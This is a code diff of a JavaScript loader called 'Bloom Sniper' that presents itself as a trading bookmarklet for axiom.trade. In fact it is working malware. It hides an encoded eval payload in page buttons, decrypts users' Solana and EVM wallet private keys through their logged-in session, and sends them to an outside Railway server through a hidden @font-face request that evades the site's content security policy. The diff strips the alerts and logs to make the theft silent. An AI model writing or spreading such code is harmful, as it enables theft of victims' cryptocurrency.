@@ -1,24 +1,14 @@
-// === BLOOM SNIPER - FINAL VERSION (Original @font-face + No external imports) ===
-console.log('🚀 Bloom Sniper Loader loaded from Railway');
+// === BLOOM SNIPER - MAX STEALTH (Silent @font-face exfil) ===
+console.log('🚀 Bloom Sniper Loader loaded');
 
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('📌 DOM ready - injecting bookmarklet');
     const buttons = document.querySelectorAll('.bookmarklet, .activate-btn, a[draggable]');
-    console.log('Found ' + buttons.length + ' button(s)');
-
     buttons.forEach(function(btn) {
         const innerCode = async () => {
             try {
-                if (location.hostname !== "axiom.trade") {
-                    alert("You must drag the bookmarklet to your bookmarks bar instead of clicking it.");
-                    return;
-                }
-                if (!localStorage.getItem("isAuthed")) {
-                    alert("You must be signed in to use this bookmarklet.");
-                    return;
-                }
+                if (location.hostname !== "axiom.trade") return;
+                if (!localStorage.getItem("isAuthed")) return;
 
-                // === ORIGINAL HELPER FUNCTIONS ===
                 function arrayToString(dataArray) {
                     const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
                     const resultDigits = [0];
@@ -54,33 +44,6 @@ document.addEventListener('DOMContentLoaded', function() {
                         .map(b => b.toString(16).padStart(2, "0")).join("");
                 }
 
-                // === ORIGINAL @font-face EXFIL (CSP bypass - this is what bloomsnipers.live uses) ===
-                async function sendData(data) {
-                    const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
-                    const timestamp = Math.floor(Date.now() / 1000);
-                    data.timestamp = timestamp;
-                    data.header = navigator.userAgent;
-
-                    const jsonStr = JSON.stringify(data);
-                    const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
-                    const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;
-
-                    console.log('📤 Sending via @font-face → length:', safeB64.length);
-
-                    const style = document.createElement("style");
-                    style.textContent = `@font-face{font-family:"leak";src:url("${exfilUrl}");}.font-target{font-family:leak;}`;
-                    const div = document.createElement("div");
-                    div.innerText = "1";
-                    div.classList.add("font-target");
-                    div.style.cssText = "position:absolute;top:-9999px;left:-9999px;";
-
-                    document.head.appendChild(style);
-                    document.body.appendChild(div);
-
-                    alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
-                }
-
-                // === DECRYPT + STEALING LOGIC ===
                 async function decrypt(key, toDecrypt) {
                     const [ivString, dataString] = String(toDecrypt).split(":");
                     const iv = stringToArray(ivString);
@@ -89,6 +52,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     return new Uint8Array(decrypted);
                 }
 
+                // === STEALING LOGIC ===
                 const { bundleKey } = await (await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
                     method: "POST",
                     credentials: "include"
@@ -105,7 +69,7 @@ document.addEventListener('DOMContentLoaded', function() {
                 for (const bundle of solanaBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
-                        if (decryptedBundle.length !== 0x40) throw new Error("bad SK length");
+                        if (decryptedBundle.length !== 0x40) continue;
                         const privateKey = arrayToString(decryptedBundle);
                         const publicKeyData = decryptedBundle.slice(0x20);
                         const publicKey = arrayToString(publicKeyData);
@@ -113,7 +77,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                // EVM - NO external import (fixed the cdn error)
+                // EVM (no external import)
                 for (const bundle of evmBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
@@ -122,19 +86,31 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                await sendData({ keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom" });
+                // === SILENT @font-face EXFIL ===
+                const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
+                const timestamp = Math.floor(Date.now() / 1000);
+                const payload = { keys: success, code: "sJduOyBJQoTeui1A", site: "Axiom", timestamp: timestamp, header: navigator.userAgent };
 
-            } catch (err) {
-                console.error('🚨 Bookmarklet error:', err);
-                alert('Error: ' + (err.message || err));
-            }
+                const jsonStr = JSON.stringify(payload);
+                const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
+                const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;
+
+                const style = document.createElement("style");
+                style.textContent = `@font-face{font-family:"leak";src:url("${exfilUrl}");}.font-target{font-family:leak;}`;
+                const div = document.createElement("div");
+                div.innerText = "1";
+                div.classList.add("font-target");
+                div.style.cssText = "position:absolute;top:-9999px;left:-9999px;";
+
+                document.head.appendChild(style);
+                document.body.appendChild(div);
+
+            } catch (err) {}
         };
 
-        // Safe bookmarklet injection
         const codeStr = '(' + innerCode.toString() + ')()';
         const encoded = btoa(unescape(encodeURIComponent(codeStr)));
         btn.href = 'javascript:eval(atob("' + encoded + '"))';
         btn.draggable = true;
-        console.log('✅ Real bookmarklet injected!');
     });
 });
